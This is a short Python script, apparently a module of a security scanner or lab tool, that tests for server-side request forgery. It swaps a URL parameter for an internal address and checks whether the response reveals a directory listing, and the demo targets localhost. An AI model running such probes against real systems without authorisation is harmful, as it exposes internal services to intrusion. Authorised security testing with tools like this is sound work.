from core.requester import Requester
import urllib.parse

def make_ssrf_request(target_url, param_name, ssrf_url):
    """
    向 target_url 发送请求，将 param_name 参数的值设置为 ssrf_url，
    返回响应文本。失败返回 None。
    """
    req = Requester()
    parsed = urllib.parse.urlparse(target_url)
    params = urllib.parse.parse_qs(parsed.query)
    params[param_name] = [ssrf_url]
    new_query = urllib.parse.urlencode(params, doseq=True)
    test_url = urllib.parse.urlunparse(parsed._replace(query=new_query))
    
    try:
        status, text = req.get(test_url)
        return text
    except Exception as e:
        print(f"请求失败: {e}")
        return None

if __name__ == "__main__":
    target = "http://127.0.0.1:5006/fetch?url=http://127.0.0.1:5005/"
    content = make_ssrf_request(target, "url", "http://127.0.0.1:8000/")
    if content and ("Directory listing" in content or "Index of" in content):
        print("[+] SSRF成功，内网服务可访问")
    else:
        print("[-] SSRF未成功或未检测到特征")